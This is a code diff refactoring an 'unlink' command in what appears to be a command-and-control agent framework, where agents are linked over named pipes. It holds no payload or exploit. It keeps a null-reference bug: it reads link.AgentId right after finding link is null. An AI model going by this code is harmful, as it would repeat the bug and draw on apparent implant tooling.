@@ -12,17 +12,17 @@ namespace Agent.Commands
     {
         public override string Name => "unlink";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             if (task.SplittedArgs.Count() != 1)
             {
                 return;
             }
 
-            var link = agent.PipeCommunicator.Links.FirstOrDefault(l => l.AgentId == task.SplittedArgs[0]);
+            var link = context.Agent.PipeCommunicator.Links.FirstOrDefault(l => l.AgentId == task.SplittedArgs[0]);
             if (link == null)
-                result.Result += "Unable to find link for " + link.AgentId;
-            agent.PipeCommunicator.Links.Remove(link);
+                context.Result.Result += "Unable to find link for " + link.AgentId;
+            context.Agent.PipeCommunicator.Links.Remove(link);
         }
     }
 }
